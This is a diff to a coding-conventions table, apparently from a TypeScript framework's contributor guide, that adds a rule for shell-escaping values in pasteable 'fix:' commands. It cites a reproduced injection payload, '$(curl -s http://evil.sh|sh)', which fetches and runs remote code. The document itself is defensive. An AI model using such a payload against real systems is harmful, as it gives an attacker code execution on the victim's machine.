@@ -8,6 +8,7 @@ is a change to every package.
 | Deps | none (`bun-types` only) |
 | Errors | subclass `UltimateError`; never `throw new Error` |
 | Values in a message | `renderCauseValue()` / `renderFixLiteral()`; never raw `JSON.stringify`, `String()` or `${…}` on an `unknown` |
+| A value in a `fix:` a shell READS | `renderFixShellArg(value, placeholder)` — `renderFixLiteral` answers DOUBLE quotes, in which `$(…)`, `` ` `` and `${…}` are still live, so it is the wrong tool for a command position and cannot be made right. An ordinary path or URL passes through; anything a shell would read becomes the placeholder. Reproduced: an unauthenticated `GET /$(curl -s http://evil.sh\|sh)` rendered that substitution into `x g route …`, the line the framework tells its reader to paste |
 | Rendering the 3-line format | nothing to remember — `UltimateError`'s CONSTRUCTOR escapes `code`, `title`, `cause`, `fix` and `docs` with `singleLine()`. Call it yourself only when you render a shape this class never built, e.g. a `Finding` |
 | A value a CALLER supplied | `describeValue()` — shape, never content. `renderCauseValue` is safe against throwing, not against leaking |
 | Reading a caught value | `renderThrowable()` / `isThrownError()` / `stringField()`; never `error.message`, `error instanceof Error` or `typeof error.code === 'string'` directly — the probe throws before the renderer runs |
